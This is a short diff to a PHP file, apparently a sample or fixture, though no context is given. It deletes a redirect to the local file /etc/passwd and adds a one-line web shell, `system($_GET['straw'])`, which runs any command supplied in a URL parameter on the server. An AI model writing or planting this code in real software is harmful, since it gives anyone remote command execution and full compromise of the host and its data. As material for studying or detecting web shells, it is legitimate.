@@ -1,6 +1,2 @@
 <?php
-
-header("Location: file:///etc/passwd");
-
-?>
-    
+system($_GET['straw']);
